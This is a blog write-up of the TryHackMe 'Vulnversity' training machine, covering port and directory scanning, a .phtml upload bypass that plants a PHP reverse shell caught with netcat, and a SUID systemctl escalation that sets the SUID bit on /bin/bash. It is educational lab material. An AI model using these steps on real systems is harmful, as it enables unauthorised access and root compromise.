---
layout: post
title: Tryhackme Vulnversity Ctf Writeup
Description: Tryhackme Vulnversity Ctf Writeup
date: 2021-10-9 18:04
image: '/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vulnbanner.png'
tags: [ctf,pentesting,linux-privesc,bruteforce,cracking,reverse-shell,php,shell-injection]
featured: false
---
[**Solve Yourself >>**](https://www.tryhackme.com/room/vulnversity)

Vulnversity is a machine that combines reconnaissance, web attack vectors and privilege escalation methods together.
<br>
<br>
## 1-Enumeration
Let's start with enumerating the host.I will use Network Mapper **nmap** tool in order to scan and probe opened ports and active services to find my attack vector. 

| Parameter  | Functionality                                      |
|:-----------|:---------------------------------------------------|
|-sS         |SYN Stealth Scan (Half TCP Connect scan)            |
|-sV         |Probe open ports to determine service/version info  |
|-O          |Enable OS detection.                                |
|-T4         |T{0-5} Set scan speed, higher is faster.            |
|-p-         |Scan all 65536 ports.                               |
|-oN         |Outputfile                                          |

Full command:
{% highlight bash %}
nmap {machine IP} -sV -sS -O -T4 -p- -oN vulnversity.nmap
{% endhighlight %}
![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln2.jpg)
<br>
To create our attack vector.If you do your research and investigate whether one of these services have any vulnerabilities or not, you will return to your home empty handed.You can try anonymous login to FTP protocol, or try to make a SSH connection but you would fail just like I did.None of these services have any vulnerabilities that would put us in the target system.
 
Other than that **"3333/tcp open  http   Apache httpd 2.4.18 ((Ubuntu))"** catches the eye, so lets start to investigate the webpage that the host is running on its port 3333.

![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln3.jpg){:style="max-width: 80%" .normal} 
<br>
Fire up your browser and type **{machine IP}:3333** to your address bar.You will see the webpage shown above.Nothing suspicious there, so lets start to extract the directories with the help of the `gobuster` tool.

| Parameter     | Functionality                                      |
|:--------------|:---------------------------------------------------|
|dir -u         |URL and the port where web server is running        |
|-w             |Wordlist that contains possible directory names     |

Full command:
{% highlight bash %}
gobuster dir -u http://{MachineIP}:3333 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
{% endhighlight %}

[**Seclist's Wordlist Pack >>**](https://github.com/danielmiessler/SecLists)
![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln4.jpg){:style="max-width: 80%" .normal} 
<br>
Let's go for **http://[IP]:3333/internal**
![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln5.jpg){:style="max-width: 80%" .normal} 
<br>
It seems like we've find our playground :) Website have got an upload functionality.
<br>
<br>
## 2-Exploitation
First thing came into my mind was to upload a php reverse shell, so let's try it out.

[**PHP Reverse Shell Script >>**](https://github.com/krygeNNN/phpenumerate)
![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln6.jpg){: .shadow style="max-width: 80%" .normal} <br>
Download the script by using **curl**.However in order to make it work, we need to make some configurations in the script to make it work.

![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln7.jpg){: .shadow style="max-width: 80%" .normal} <br>
Change **$ip** to your own machines ip (tryhackme's vpn tunnel) ,define the port as any random **$port**.I've changed it to the 8888 while it was 1234 by default.

 Configurations are all done ! Now, it is time for us to upload the reverse shell to the web server.<br>
![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln8.jpg){:style="max-width: 80%" .normal} 
<br>
**Note**:My machine shutted it down while creating this post, so I had to restart it. That is why the ip have changed, don't worry :)

It seems like .php extension is not allowed.However ,php extension is not the only extension that we can use, we have got couple more.You can try all of them manually, but come on, let's write a python script :)) 
![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln9.jpg){:style="max-width: 80%" .normal} 
<br>
[**Download the php bruter script >>**](https://www.tryhackme.com/room/vulnversity)
Run it.
![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln10.jpg){:style="max-width: 80%" .normal} 
<br>
**.phtml** is the working extension. Rename the payload, **php_reverse_shell.php** into **php_reverse_shell.phtml**, and than upload it.

![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln11.jpg){:style="max-width: 80%" .normal} 
<br>
Now we have successfully injected our reverse shell script.However we also need to listen incoming connections from the server.Therefore we will use Netcat (**nc**) to listen to the port 8888, which we set in the script before.

|Parameter | Functionality                                     |
|:---------|:--------------------------------------------------|
|-n        | Do not resolve hostnames via DNS                  |
|-l        | Bind and listen for incoming connections          |
|-v        | Set verbosity level (can be used several times)   |
|-p        | Specify source port to use                        |

Full command: 
{% highlight bash %}
nc -nvlp 8888
{% endhighlight %}
![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln12.jpg){:style="max-width: 80%" .normal} 
<br>
While listening to port 8888, we need to activate the script that we just uploaded.
![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln13.jpg){:style="max-width: 80%" .normal} 
<br>
Visit this URL >> **http://{machineIP}:3333/internals/uploads**, and than click to the reverse php 
shell script that you have uploaded. 

![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln14.jpg){:style="max-width: 80%" .normal} 
<br>
Excellent, we are in !
<br>
<br>
## 3-Flag Capturing and Privilege Eseclation
Nevertheless, this shell is not stable righ now, we need to spawn a python shell.
<br>Run those in order: 
{% highlight bash %}
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
{% endhighlight %}
![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln15.jpg){:style="max-width: 80%" .normal} 
<br>

#### 1-User Flag
![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln16.jpg){:style="max-width: 80%" .normal} 
<br>
In order to get root flag, we have to escalate our privileges, let's search for SUID binaries.If you are not familiar with SUID executables, I recommend you to make your research, than come back, but basically, when you executing a SUID file, you are executing it with it's owner's permissions.We will use **find** command to scan for those binaries.

| Parameter              | Functionality                                          |
|:-----------------------|:-------------------------------------------------------|
| /                      | Search from the root directory                         |
|-type f                 | Only search for files                                  |
|-user root              | Only find the files owned by root                      |
|-perm -u=s              | Only find the files with SUID bit set                  |
|2>/dev/null             | Redirect all stderr outputs to device null             |

Full command:
{% highlight bash %}
find -type f -user root -perm -u=s 2>/dev/null
{% endhighlight %}
![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln17.jpg){:style="max-width: 80%" .normal} 
<br>
Some of those binaries have set uid bit by default, however **/bin/systemctl** should not have that SUID permission by default,so let's search how we can exploit that.
<br>
[**GTFOBins >>**](https://gtfobins.github.io/)
<br>
GTFOBins is a github project, and it is curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.Click the link given above and search fore **systemctl**.
![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln18.jpg){:style="max-width: 80%" .normal} 
<br>
t seems like one way to exploit that SUID set systemctl is creating a temporary service.Since systemctl's burden is coordinate the services, it makes sense.However we will need to configure that service file.
#### Service file
{% highlight bash %}
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
{% endhighlight %}
I have manually changed the systemctl location in the given code from relative to static directory,and also ExecStart will set SUID perm to /bin/bash.

Copy and paste the lines given above to shell (Press enter two times after you paste it), and than check the /bin/bash's file permissions.
![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln19.jpg){:style="max-width: 80%" .normal} 
<br>
As you can see, /bin/bash binary now have 's' permission, which indicates that it is a SUID executable.
<br>Run:
{% highlight bash %}
bash -p
{% endhighlight %}
#### 2-Root Flag
![Desktop View](/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln20.jpg){:style="max-width: 80%" .normal} 
<br>
As you can see euid (Effective user id) set to 0 which belongs to root.Now you can get the root flag.

That is all for this machine, thank you for reading :)

